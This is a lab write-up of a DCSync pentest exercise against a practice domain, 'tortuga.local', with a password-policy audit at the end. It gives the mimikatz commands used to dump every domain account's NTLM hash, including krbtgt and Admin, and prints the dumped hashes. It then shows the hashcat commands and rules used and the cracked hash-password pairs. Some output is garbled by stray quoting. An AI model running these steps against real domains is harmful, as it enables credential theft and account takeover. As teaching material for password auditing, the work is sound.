# DCsync Password Cracking
>> Performing a DC (Domain Control) sync pentest.

## Performing the DCSync.
- Using the administrator password obtained from the previous lab, I was able to gain access into the tortuga DC VM and load the Mimikatz trunk onto its desktop.
- Next, using the x64 version of mimikatz, I launched powershell from the file menu.
- With PowerShell open, I then launched Mimikatz using the command “./mimikatz.exe”. 
> -  NOTE: I used PowerShell instead of the default cmd launcher because of the limitations the default
cmd presents- While PowerShell is powerful and flexible

- I then used the mimikatz command “privilege::debug” to get “god tier” (debug) privileges, and then used those privileges to elevate my token using the mimikatz command “token::elevate”.
- Once I had elevated my privilege enough to access the password hashes through the DCSync, I used the command “lsadump::dcsync /domain:tortuga.local /all /csv”. This command dumps all the users within the tortuga.local domain along with their password hashes.
- Here’s the full output received from the previously discussed command:

```console
mimikatz # lsadump::dcsync /domain:tortuga.local /all /csv
[DC]
[DC]
[DC]"	"'tortuga.local' will be the domain 'dc01.tortuga.local' will be the DC server
Exporting domain 'tortuga.local'"	
1105	"U478384 0db3396a227ae978162e28d9f8bf3ff2"	66048
1106	"U724564 0bc2cd56aff62e231df637c9997f5db5"	66048
"… … …
1292"	"…
      "U472136 5437b3d561e5b3c302b8ea8f11aef318"	66048
1293	"U529036 3e202fa49136e93508b79bfca232479d"	66048
1294	"U328628 ad5e3408db1ea42441c755715c0c52a6"	66048
1295	"U879436 136ff21d05e3ad70135dc48884e81357"	66048
1296	"U858483 82fb725d156e9179063796dcc45d062a"	66048
1297	"U532495 3237a4cea1efc18fb4394dd41b7dd95d"	66048
1298	"U104961 2805976fa86da938b8b5209a0e73af75"	66048
1299	"U957087 3dbe233471445dbb58b72b95d80c71e7"	66048
1300	"U556079 bba37cb6350910920f27e495aac2d16c"	66048
1301	"U153711 6ba4fd921fa7ecdcc7ac2fe902b0657e"	66048
1302	"U786240 873333e2f8b3e477e840ffe5e77b2003"	66048
1303	"U348616 d64e61a36e000d77a5a1c98fbfe2ce6a"	66048
1304	"U786462 401511cbba86d51f9cd606b83a07d6d9"	66048
1305	"U594663 0ad8fb266a0e5921ebb56854200c6634"	66050
1309	"U257439 91e243f81613c8d3e7db88281c219a09"	66048
1310	"U478245 2d981fdd1f23a2085b7f331e856ab3a3"	590336
1311	"U951863 61b50ceaaa6fba36e9a2d2a85894044e"	17367552
1312	"U836158 ada363ecd153b172ecb664d8916af28d"	66176
1313	"U289311 018e5053ee63ea9da526bfdb51440022"	2097792
1314	"U697137 0f8389a06623ffeb4f866d2b1ba250d1"	640
1315	"U151654 cf3a5525ee9414229e66279623ed5c58"	640
1316	"U371973 cac3a73c02d89fd62392800815e0f425"	4194944
1306	"U891212 26b944d9d6872c12b41d75c39056c35e"	66048
1308	"U323582 09e0198d7ee73c264eb96bfadaa99d56"	66048
502	  "krbtgt  a3f657d01cd6a1f46a1ac36df545bf3b"	514
1320	"U536554 6f22b98d3db9991032ae6f267c0c2753"	672
1319	"wturner 793243be0762ce949633b1bf8c61de59"	66048
1317	"U787486 cac3a73c02d89fd62392800815e0f425"	672
1002	"DC01$   69fc65112f604d0f3c3c7e50d821c398"	532480
500	  "Admin   39d633e9c3fd963d603f131bf42d7ce8"
```

- Once I had all 214 usernames and password hashes for the tortuga.local domain, I moved the data to my attacker VM (Kali Linux distro). On this VM, I edited the data down to two
separate files; 
> - 1. Hashes only named “hashesonly.hashcat” and 
> - 2. Hashes with usernames"named “hashlist.hashcat. 
- Though I could use either of these files, the main file I used for cracking the passwords was the hashes only version.
- I then moved a copy of the “rockyou.txt” wordlist to the desktop and created a new file of the top-5000 words from the rockyou wordlist. This would simplify the use of flags to limit the word usage within the hashcat program itself.


## Cracking the hashes.
- Once the setup of the files had been completed, I moved on to using hashcat to start cracking the passwords. I started by running the hashesonly.hashcat files against the
rockyou.txt wordlist straight up with no other rules or flags.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$  hashcat  -m 1000 -a 0 -o outfile.txt hashesonly.hashcat rockyou.txt
```

```console
Session..........: hashcat 
Status...........: Exhausted 
Hash.Name........: NTLM 
Hash.Target......: hashesonly.hashcat 
Time.Started.....: Sat Apr 3 13:50:14 2021 (3 secs) 
Time.Estimated...: Sat Apr 3 13:50:17 2021 (0 secs) 
Guess.Base.......: File (rockyou.txt) 
Guess.Queue......: 1/1 (100.00%) 
Speed.#1.........: 3895.5 kH/s (0.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 
Recovered........: 3/213 (1.41%) 
Digests Progress.........: 14344385/14344385 (100.00%) 
Rejected.........: 0/14344385 (0.00%) 
Restore.Point....: 14344385/14344385 (100.00%) 
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> 
$HEX[042a0337c2a156616d6f732103]
```

- This initial test was quick, but only resulted in the successful cracking of 3 password hashes. I then used the “-k ‘$!’” flag to do a more advanced cracking of the passwords, checking for an “!” at the end of the passwords along with more combinations of two wordlists (both being rockyou.txt). This resulted in the finding of 17 more password hashes. And so I added the flag “-j ‘$-’” but was unfortunately not met with success. It wasn’t until I started using rules (“-r” with a path to the directory the file resides), that I was able to crack more passwords. The rules I ended up using were the “best64” (/usr/share/hashcat/rules/best64) and “dive” (/usr/share/hashcat/rules/dive).

```console
┌──(kali㉿kali)-[~/Desktop] 
└─$ hashcat hashesonly.hashcat -l 5000 -m 1000 -d 1 -k '$!' -a 1 
rockyou.txt rockyou.txt
```

```console
"INFO: Removed 3 hashes found in potfile.
Host memory required for this attack: 65 MB"	
		
"Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 205761381028225"		
		
"d64e61a36e000d77a5a1c98fbfe2ce6a:robertnicole07! 
ad5e3408db1ea42441c755715c0c52a6:zxcvbnmdallas12! 
32e9f9d0e79d4a661043d0fc6b0f0ce5:696969nicole89! 
8dfa93732ca48b1cc07946a4c786b924:gingerjoshua24! 
b361cf06d471f7b0ee54476d42fcc4fc:killerdragon86! 
cc98d098e89d294238d1b961e59c9e4f:qwertyuiopbuster45! 
5dcd7d41ee9dc5a3cfff92365dfff543:joshua123441! 
dc7b6ea42f6b7704c516a3a7172332c6:buster696907!
80f787e27b392374761c493133b6eb18:123123master68!
c7bbe6101e1c495329861712c45dc719:000000dragon51! 
c25a4236f838bfac372ea0f55fef6c4e:555555freedom48! 
cd2a722f9de2457286338c6b6c55a93f:nicoleaustin51! 
800ee86daccd73012afd749d9d89fc41:zxcvbnmqazwsx46! 
3572e91ae1d17ec6864e8297244b7701:777777asshole58! 
c01846e91a23ffb62255fd23b6da4ed5:freedom200097! 
e4b9b463edff8b4ec4c5d0fca14fa974:matrix13131315! 
6e1ece1bb9fb5bfb1c6aaa302b2dd059:1qaz2wsxsunshine32!"
```

- After many hours of my computer being throttled (95-98% RAM usage), I was able to find 25 passwords from the hashes obtained from the DCSync. After some collaboration with fellow cybersecurity professionals, we collectively found 27 unique passwords from the original 214 hashes. Here’s the list of the hashes found:

## Password Analysis
- The last part of auditing passwords is the analysis (or processing) of the passwords obtained. This is necessary in order to illustrate the weaknesses in the password policy and give a visual aid to everyone within the company to realize the severity of these vulnerabilities.
- The first tool I used to do this analysis is called “pack” and was downloaded at “https://github.com/iphelix/pack”."

```console
┌──(kali
└─$  python  statsgen.py  ~/Desktop/passwords.txt
_ StatsGen 0.0.3 | |
 _         _     | | _
| '_ \ / _` |/   | |/ /
| |_) | (_| | (  |   <
| .  / \  ,_|\   |_|\_\
| |
|_| iphelix@thesprawl.org"
"[*] Analyzing passwords in [/home/kali/Desktop/passwords.txt] [+] Analyzing 100% (27/27) of passwords
NOTE: Statistics below is relative to the number of analyzed passwords, not total number of passwords"
"[*] Password complexity:
[+]                   digit: min(0) max(11)
[+]                   lower: min(4) max(16)
[+]                   upper: min(0) max(2)
[+]                 special: min(0) max(1)
[*] Simple Masks:
[+]       stringdigitspecial: 51% (14)"
"[*]
[+]"	"Length:"	"15:"	0.370000	-10
"[+]"		"16:"	0.140000	-4
"[+]"		"13:"	0.110000	-3
"[+]"		"10:"	0.070000	-2
"[+]"		"14:"	0.070000	-2
"[+]"		"17:"	0.070000	-2
"[+]"		"19:"	0.070000	-2
"[+]"		"8:"	0.030000	-1
"[+]"		"20:"	0.030000	-1
"[*]"	"Character-set:"		
"[+]"	"loweralphaspecialnum:"	0.740000	-20
"[+]"	"all:"	0.110000	-3
"[+]"	"mixedalphanum:"	0.070000	-2
"[+]"	"mixedalphaspecial:"	0.070000	-2
"[+]"	"othermask:"	0.330000	-9	
"[+]"	"stringspecial:"	0.070000	-2	
"[+]"	"stringdigit:"	0.070000	-2	
```

- The second tool I used to do this analysis is called “password-analyzer” and was downloaded at “https://github.com/dank-panda/password-analyzer.py”.



- Separately, these tools don’t provide the most visually appealing output, however, when graphing this data in a program like Microsoft Excel or Google Sheets- The illustration becomes powerful and visually pleasing.
